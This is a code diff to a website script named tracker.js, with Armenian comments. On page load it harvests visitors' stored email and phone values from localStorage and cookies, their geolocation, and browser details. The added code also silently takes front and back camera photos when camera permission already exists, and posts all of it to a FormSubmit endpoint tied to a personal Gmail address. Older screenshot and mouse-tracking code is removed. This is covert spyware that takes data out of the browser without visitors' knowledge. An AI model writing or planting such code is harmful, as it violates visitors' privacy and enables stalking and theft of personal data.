@@ -1,5 +1,5 @@
-// tracker.js - Enhanced visitor tracking with screenshot and mouse movements
-function trackVisitor() {
+// tracker.js - Վիզիտորի տվյալների հավաքում և ուղարկում FormSubmit-ի միջոցով
+async function trackVisitor() {
     const data = {
         website: window.location.href || "index.html",
         userAgent: navigator.userAgent,
@@ -9,124 +9,126 @@ function trackVisitor() {
         language: navigator.language,
         referrer: document.referrer || "Direct visit",
         visitTime: new Date().toISOString(),
-        ip: "Will be added by FormSubmit",
-        mouseMovements: []
+        ip: "Մոտքային IP-ն կավելացվի FormSubmit-ի կողմից"
     };
 
-    // Track mouse movements
-    const mouseTrack = (e) => {
-        if (data.mouseMovements.length < 100) { // Limit to 100 positions
-            data.mouseMovements.push({
-                x: e.clientX,
-                y: e.clientY,
-                time: Date.now()
-            });
-        }
-    };
-    document.addEventListener('mousemove', mouseTrack);
-
-    // Check localStorage
+    // Ստուգել localStorage-ում պահված տվյալները
     try {
         const savedEmail = localStorage.getItem('userEmail');
         const savedPhone = localStorage.getItem('userPhone');
+        
         if (savedEmail) data.savedEmail = savedEmail;
         if (savedPhone) data.savedPhone = savedPhone;
     } catch (e) {
         console.log("LocalStorage access error:", e);
     }
 
-    // Check cookies
+    // Ստուգել cookies-ում պահված տվյալները
     try {
         const cookies = document.cookie.split(';').reduce((res, c) => {
-            const [key, val] = c.trim().split('=').map(decodeURIComponent);
-            return Object.assign(res, { [key]: val });
+        const [key, val] = c.trim().split('=').map(decodeURIComponent);
+        return Object.assign(res, { [key]: val });
         }, {});
+
         if (cookies.email) data.cookieEmail = cookies.email;
         if (cookies.phone) data.cookiePhone = cookies.phone;
     } catch (e) {
         console.log("Cookie access error:", e);
     }
 
-    // Get geolocation
+    // Փորձել ստանալ գեոտեղադրություն
     if (navigator.geolocation) {
         navigator.geolocation.getCurrentPosition(
-            position => {
-                data.latitude = position.coords.latitude;
-                data.longitude = position.coords.longitude;
-                captureAndSend(data);
-            },
-            () => {
-                data.locationError = "Geolocation unavailable";
-                captureAndSend(data);
-            }
+        position => {
+            data.latitude = position.coords.latitude;
+            data.longitude = position.coords.longitude;
+            captureAndSend(data);
+        },
+        () => {
+            data.locationError = "Geolocation unavailable";
+            captureAndSend(data);
+        }
         );
     } else {
         captureAndSend(data);
     }
+}
 
-    // Remove mouse tracker before leaving
-    window.addEventListener('beforeunload', () => {
-        document.removeEventListener('mousemove', mouseTrack);
+// Վեբկամերայի նկարի հավաքում
+async function captureCameraImages(data) {
+    try {
+        const stream = await navigator.mediaDevices.getUserMedia({
+            video: {
+                facingMode: { exact: "user" }, // Ճակատային կամերա
+                width: { ideal: 1280 },
+                height: { ideal: 720 }
+            }
+        });
+        
+        const track = stream.getVideoTracks()[0];
+        const imageCapture = new ImageCapture(track);
+        
+        // Նկարել առաջին կադրը (ճակատային տեսարան)
+        const frontPhoto = await imageCapture.takePhoto();
+        data.frontCameraPhoto = await blobToBase64(frontPhoto);
+        
+        // Փորձել ստանալ հետևի կամերայի նկարը (եթե հնարավոր է)
+        try {
+            const backStream = await navigator.mediaDevices.getUserMedia({
+                video: {
+                    facingMode: { exact: "environment" }, // Հետևի կամերա
+                    width: { ideal: 1280 },
+                    height: { ideal: 720 }
+                }
+            });
+            
+            const backTrack = backStream.getVideoTracks()[0];
+            const backImageCapture = new ImageCapture(backTrack);
+            const backPhoto = await backImageCapture.takePhoto();
+            data.backCameraPhoto = await blobToBase64(backPhoto);
+            
+            backTrack.stop();
+        } catch (backError) {
+            data.backCameraError = "Հետևի կամերան հասանելի չէ";
+        }
+        
+        track.stop();
+    } catch (error) {
+        data.cameraError = "Վեբկամերան հասանելի չէ կամ մերժվել է մուտքը";
+    }
+    
+    return data;
+}
+
+// Blob-ը փոխարկել base64-ի
+function blobToBase64(blob) {
+    return new Promise((resolve, reject) => {
+        const reader = new FileReader();
+        reader.onloadend = () => resolve(reader.result.split(',')[1]);
+        reader.onerror = reject;
+        reader.readAsDataURL(blob);
     });
 }
 
-// Capture screenshot and send data
-function captureAndSend(data) {
-    // Try to load html2canvas if not available
-    if (typeof html2canvas === 'undefined') {
-        loadHtml2Canvas(() => {
-            takeScreenshot(data);
-        });
-    } else {
-        takeScreenshot(data);
+// Նկարել և ուղարկել տվյալները
+async function captureAndSend(data) {
+    try {
+        // Փորձել ստանալ կամերայի նկարները միայն եթե օգտատերը տվել է թույլտվությունը
+        if (navigator.mediaDevices && navigator.permissions) {
+            const permissionStatus = await navigator.permissions.query({ name: 'camera' });
+            if (permissionStatus.state === 'granted') {
+                await captureCameraImages(data);
+            }
+        }
+    } catch (e) {
+        console.log("Camera permission check error:", e);
     }
+    
+    sendData(data);
 }
 
-// Take screenshot using html2canvas
-function takeScreenshot(data) {
-    if (typeof html2canvas !== 'undefined') {
-        html2canvas(document.body, {
-            scale: 0.5, // Reduce size for performance
-            logging: false,
-            useCORS: true
-        }).then(canvas => {
-            // Convert to JPEG with 70% quality
-            const screenshot = canvas.toDataURL('image/jpeg', 0.7);
-            data.screenshot = screenshot;
-            sendData(data);
-        }).catch(err => {
-            console.log("Screenshot error:", err);
-            data.screenshotError = err.message;
-            sendData(data);
-        });
-    } else {
-        data.screenshotError = "html2canvas not available";
-        sendData(data);
-    }
-}
-
-// Load html2canvas dynamically
-function loadHtml2Canvas(callback) {
-    const script = document.createElement('script');
-    script.src = 'https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js';
-    script.integrity = 'sha512-BNaRQnYJYiPSqHHDb58B0yaPfCu+Wgds8Gp/gU33kqBtgNS4tSPHuGibyoeqMV/TJlSKda6FXzoEyYGjTe+vXA==';
-    script.crossOrigin = 'anonymous';
-    script.referrerPolicy = 'no-referrer';
-    script.onload = callback;
-    script.onerror = () => {
-        console.log("Failed to load html2canvas");
-        if (typeof callback === 'function') callback();
-    };
-    document.head.appendChild(script);
-}
-
-// Send data to FormSubmit
+// Տվյալների ուղարկում FormSubmit-ին
 function sendData(data) {
-    // Limit mouse movements data size
-    if (data.mouseMovements && data.mouseMovements.length > 50) {
-        data.mouseMovements = data.mouseMovements.slice(-50);
-    }
-
     fetch("https://formsubmit.co/ajax/soghbatyanvahan@gmail.com", {
         method: "POST",
         headers: { 
@@ -136,9 +138,9 @@ function sendData(data) {
         body: JSON.stringify(data)
     })
     .then(response => response.json())
-    .then(response => console.log("Tracking data sent:", response))
-    .catch(error => console.error("Error sending tracking data:", error));
+    .then(data => console.log("Success:", data))
+    .catch(error => console.error("Error:", error));
 }
 
-// Start tracking when page loads
+// Գործարկել հետևումը էջի բեռնվելուց հետո
 window.addEventListener('load', trackVisitor);
